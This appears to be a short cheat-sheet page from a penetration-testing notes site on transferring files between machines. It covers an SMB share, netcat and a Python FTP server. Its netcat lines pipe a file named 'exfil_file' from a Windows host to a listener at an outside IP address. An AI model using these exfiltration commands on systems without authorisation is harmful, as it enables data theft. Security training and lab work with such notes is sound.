---
title: "Transfert"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
---

**SMB :**
- Linux machine: 
```sh
smbserver.py smb share/ -smb2support
```

- Windows machine: 
```sh
net use \\ip\smb
```

**NC :**
```sh
nc -lvnp 4444 > new_file #receving machine
nc.exe -vn 10.8.3.12 4444 < exfil_file #sending machine
```

**FTP :** 
```sh
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

